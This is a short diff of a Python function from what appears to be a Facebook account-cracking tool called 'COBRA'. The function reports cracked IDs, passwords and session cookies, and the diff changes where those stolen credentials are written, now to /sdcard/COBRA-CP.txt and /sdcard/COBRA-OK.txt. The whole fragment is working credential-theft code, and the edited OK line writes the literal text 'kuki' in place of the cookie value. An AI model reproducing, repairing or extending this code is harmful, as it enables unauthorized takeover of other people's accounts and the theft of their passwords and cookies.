@@ -502,7 +502,7 @@ def crack(idf,pwv):
 				#COBRA-BOSS
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•COBRA-Cp] {idf} • {pw}')     
 				os.system('espeak -a 300 " MUBIN, CP, ID"')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				open('/sdcard/COBRA-CP.txt','a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -514,7 +514,7 @@ def crack(idf,pwv):
 				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•COBRA-Ok😘] {idf} • {pw}\n\033[0;93m[🇧🇩]= COOKIES • \033[0;92m{kuki} ')
 				print('\033[0;94m==============================================================')
 				os.system('espeak -a 300 " FIROZ,  Ok,  ID"')
-				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+				open('/sdcard/COBRA-OK.txt', 'a').write( idf+' | '+pw+'\n'+'kuki'+'\n')
 				cek_apk(session,coki)
 				break
 				
